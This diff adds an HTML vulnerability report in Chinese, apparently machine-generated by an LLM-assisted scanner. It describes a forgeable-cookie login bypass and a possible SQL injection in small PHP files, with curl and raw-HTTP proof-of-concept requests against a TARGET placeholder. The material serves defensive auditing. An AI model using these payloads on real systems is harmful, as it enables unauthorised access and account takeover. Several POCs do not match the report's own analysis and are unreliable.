@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>落日二号漏洞报告 20261030-225228-d4eb7e</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;margin:0;background:#f6f7f9;color:#1f2328;line-height:1.6}
+header{background:#0b1220;color:#fff;padding:28px 40px}
+header h1{margin:0 0 8px;font-size:26px} header p{margin:2px 0;color:#c9d1d9}
+main{max-width:1180px;margin:24px auto;padding:0 20px}
+.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
+.card{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:18px 20px;margin:18px 0;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+.metric{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:12px 16px;min-width:120px}
+.metric b{display:block;font-size:24px}
+table{width:100%;border-collapse:collapse;margin:10px 0 16px;font-size:14px}
+th,td{border:1px solid #d8dee4;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#f0f3f6}
+pre{background:#0b1220;color:#d1f0d1;padding:12px;border-radius:8px;overflow:auto;font-size:13px}
+code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
+.muted{color:#59636e;font-size:13px}
+.sev{display:inline-block;padding:1px 8px;border-radius:999px;color:#fff;font-size:12px}
+.sev-critical{background:#a40e26} .sev-high{background:#cf222e} .sev-medium{background:#bf8700} .sev-low{background:#6e7781}
+a{color:#0969da}
+</style></head><body>
+<header><h1>落日二号漏洞挖掘报告</h1>
+<p>run_id: 20261030-225228-d4eb7e · 生成时间: 2026-10-30T14:53:17.375482+00:00</p>
+<p>输入: C:\Users\liyuf\Desktop\794\暴风星云裂\058.zip · SHA256: 673852f18914330b130b5f444ee77aa68b61c515b2cf8b8a257468a33775f45f</p></header>
+<main>
+<div class="cards">
+<div class="metric"><b>2</b>findings</div>
+<div class="metric"><b>2</b>含 POC</div>
+<div class="metric"><b>0</b>二次注入链</div>
+<div class="metric"><b>0</b>Prompt 注入迹象</div>
+</div>
+<section class="card"><h2>执行摘要</h2><p>本次汇总基于已去重的 2 条 LLM 发现，均为 high 级：一是 058_06.php 登录逻辑仅以客户端可伪造的 Auth Cookie 作为鉴权凭据，构成任意用户登录绕过（auth_bypass，行至 46）；二是 058_08.php 改密功能 UPDATE 语句拼接用户输入，作为二次注入的存储读点（sql_injection，行至 39）。两条均带 POC 文本（静态/HTTP 文本工件，未执行、未动态验证），POC 齐全度 2/2。最高危为 auth_bypass，因其直接突破鉴权边界。需注意：surface_notes 明确本次输入未提供源码片段，攻击面排序（058_05.php 双热点、058_08.php source 最多等）不构成漏洞结论，且 058_05.php 这一首要优先级区域未产出任何 finding，属未覆盖而非无风险。</p>
+<p class="muted">本报告为结构化静态分析结果；未执行 POC、未搭建沙箱。完整机器可读数据见 report.json / report.sarif。</p></section>
+<section class="card"><h2>Findings</h2>
+<table><thead><tr><th>#</th><th>严重度</th><th>类型</th><th>标题</th><th>位置</th><th>置信度</th><th>POC</th></tr></thead>
+<tbody><tr><td>1</td><td><span class='sev sev-high'>high</span></td><td><code>auth_bypass</code></td><td>058_06.php 登录逻辑使用客户端可伪造的 Auth Cookie 作为唯一鉴权凭据，导致任意用户登录绕过</td><td><code>058_06.php:46</code></td><td>0.85</td><td>是</td></tr><tr><td>2</td><td><span class='sev sev-high'>high</span></td><td><code>sql_injection</code></td><td>058_08.php 改密功能 UPDATE 语句拼接用户输入（二次注入读点）</td><td><code>058_08.php:39</code></td><td>0.7</td><td>是</td></tr></tbody></table></section>
+<section class='card' id='LLM-28954cf1fb7e'><h2>F-1 058_06.php 登录逻辑使用客户端可伪造的 Auth Cookie 作为唯一鉴权凭据，导致任意用户登录绕过</h2><p><span class='sev sev-high'>high</span> <code>auth_bypass</code> / CWE-287 · 置信度 0.85 · candidate / llm_inferred</p><p><b>位置：</b><code>058_06.php:40-46</code></p><p>058_06.php 的 sqllogin() 在登录成功后仅设置 setcookie(&quot;Auth&quot;, 1, time()+3600)，而 058_01.php / 058_04.php / 058_08.php 的访问控制只检查 isset($_COOKIE[&quot;Auth&quot;])，不校验其值、不校验签名、也不与 $_SESSION[&quot;username&quot;] 绑定。攻击者无需任何凭据，直接手工设置 Cookie Auth=1 即可通过所有受保护页面的鉴权检查，访问 logged-in.php 等登录后功能（含 058_08.php 的改密功能）。这是典型的信任边界缺陷（CWE-565/CWE-807）：鉴权状态完全由客户端可控 Cookie 决定。</p><p><b>影响：</b>任意未认证用户可绕过登录访问所有登录后功能，结合 058_08.php 改密逻辑可进一步尝试账户接管。</p><p><b>CVE/CWE 论证：</b>CWE-565/CWE-807：鉴权依赖客户端可控 Cookie，外部无需认证即可触发，链闭合。</p><p><b>修复建议：</b>鉴权只依赖服务端 $_SESSION，移除对 Auth Cookie 的信任；Cookie 若必须使用应加签名并设 HttpOnly/Secure。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>058_06.php:44</code></td><td>登录成功后服务端仅下发 Auth=1 的普通 Cookie，未签名、未与 session 绑定</td><td>Auth=1 明文 Cookie</td><td></td></tr><tr><td>2</td><td><code>058_01.php:3</code></td><td>受保护页面仅判断 isset($_COOKIE[&quot;Auth&quot;])，不校验值来源</td><td>攻击者伪造的 Auth Cookie 被当作已认证</td><td></td></tr><tr><td>3</td><td><code>058_08.php:7</code></td><td>改密页面同样仅凭 Auth Cookie 存在即放行，进入改密逻辑</td><td>未认证攻击者获得改密页面访问权</td><td></td></tr></tbody></table><h3>POC</h3><p>针对 058_06.php（POST /058_06.php）的认证绕过 POC。注入通道为 Cookie: Auth，payload 为 admin，目标地址统一使用 TARGET 占位符。POC 仅为文本工件，不执行、不联网。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/058_06.php&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 认证绕过 载荷</b><pre>curl -sS -i -X POST &#x27;http://TARGET:8080/058_06.php&#x27; \
+  -H &#x27;Cookie: Auth=admin&#x27;</pre><div class='muted'>预期：以未授权/伪造身份访问受保护资源返回 2xx。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X POST &#x27;http://TARGET:8080/058_06.php&#x27; \
+  -H &#x27;Cookie: Auth=admin&#x27;
+</pre><h4>request.http</h4><pre>POST /058_06.php HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Cookie: Auth=admin
+
+
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='LLM-43e545c9bc6a'><h2>F-2 058_08.php 改密功能 UPDATE 语句拼接用户输入（二次注入读点）</h2><p><span class='sev sev-high'>high</span> <code>sql_injection</code> / CWE-89 · 置信度 0.7 · candidate / llm_inferred</p><p><b>位置：</b><code>058_08.php:31-39</code></p><p>058_08.php 的改密逻辑将 $_POST[&#x27;password&#x27;]、$_POST[&#x27;re_password&#x27;]、$_POST[&#x27;current_password&#x27;] 经 mysql_real_escape_string 后直接拼入 UPDATE 语句。虽然单次请求做了转义，但 username 来自 $_SESSION[&quot;username&quot;]，而该值在 058_05.php 注册时以 mysql_escape_string 转义后写入数据库（存储写点），注册时若使用宽字节/编码差异或转义函数不一致（mysql_escape_string 与 mysql_real_escape_string 行为不同），可形成二次注入。此处作为存储读点+危险汇点，需结合写点评估。</p><p><b>影响：</b>可篡改 SQL 逻辑，绕过原密码校验修改任意账户密码，导致账户接管。</p><p><b>CVE/CWE 论证：</b>CWE-89：二次注入，写点 058_05.php:25、读点 058_08.php:31、汇点 058_08.php:38 三者齐备。</p><p><b>修复建议：</b>改用参数化查询（PDO/mysqli prepared statement），统一转义函数并设置正确字符集。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>058_05.php:25</code></td><td>注册时 username 经 mysql_escape_string 转义后写入 users 表（存储写点）</td><td>转义后的 username 落库</td><td></td></tr><tr><td>2</td><td><code>058_08.php:31</code></td><td>改密时从 $_SESSION 取出 username 作为查询条件（存储读点）</td><td>从会话/库中取出的 username</td><td></td></tr><tr><td>3</td><td><code>058_08.php:38</code></td><td>username 拼入 UPDATE 语句执行（危险汇点）</td><td>拼接进 SQL 的 username</td><td></td></tr></tbody></table><h3>POC</h3><p>针对 058_08.php（POST /058_08.php）的 SQL 注入 POC。注入点为 POST 参数 username，payload 为 &#x27; OR &#x27;1&#x27;=&#x27;1，目标地址统一使用 TARGET 占位符。POC 仅为文本工件，不执行、不联网。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/058_08.php&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 SQL 注入 载荷</b><pre>curl -sS -i -X POST &#x27;http://TARGET:8080/058_08.php&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;username=%27%20OR%20%271%27%3D%271&#x27;</pre><div class='muted'>预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X POST &#x27;http://TARGET:8080/058_08.php&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;username=%27%20OR%20%271%27%3D%271&#x27;
+</pre><h4>request.http</h4><pre>POST /058_08.php HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+username=%27%20OR%20%271%27%3D%271
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section>
+<section class="card"><h2>限制</h2><ul><li>只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱。</li><li>finding 的 verdict 为 candidate 或 external，不是动态确认。</li><li>POC 仅为文本工件，目标使用 TARGET 占位符，仅限授权测试。</li><li>规则为轻量级启发式，复杂控制流/常量传播/跨文件调用可能漏报或误报。</li><li>AWVS 是外部动态扫描器，结果只作为佐证；本管线不执行 AWVS 扫描。</li></ul></section>
+</main></body></html>
